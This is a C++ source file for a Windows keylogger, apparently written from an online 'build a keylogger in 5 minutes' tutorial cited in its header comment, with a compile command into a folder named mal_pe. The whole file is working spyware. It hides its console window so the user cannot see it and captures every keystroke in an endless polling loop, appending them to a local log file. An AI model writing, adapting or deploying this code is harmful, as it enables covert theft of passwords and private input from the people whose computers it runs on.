/*
https://infosecwriteups.com/how-to-build-a-keylogger-with-c-in-5-minutes-221fbe780c89
c:\mal_pe\keylogger>g++ keylogger_04.cpp -o keylogger_04.exe
*/
#include <iostream>
#include <fstream>
#include <windows.h>

void hideWindow() {
    HWND stealth;
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);
}

void logKeystrokes() {
    char key;

    while (true) {
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                std::ofstream logFile("key_file_04.log", std::ios::app);

                if ((key > 64 && key < 91) || (key >= 48 && key <= 57)) {
                    logFile << key;
                } else {
                    switch (key) {
                        case VK_SPACE: logFile << " "; break;
                        case VK_RETURN: logFile << "[ENTER]"; break;
                        case VK_SHIFT: logFile << "[SHIFT]"; break;
                        case VK_BACK: logFile << "[BACKSPACE]"; break;
                        case VK_TAB: logFile << "[TAB]"; break;
                        case VK_CONTROL: logFile << "[CTRL]"; break;
                        case VK_ESCAPE: logFile << "[ESC]"; break;
                        default: logFile << "[" << key << "]"; break;
                    }
                }

                logFile.close();
            }
        }
        Sleep(10);
    }
}

int main() {
    hideWindow();
    logKeystrokes();
    return 0;
}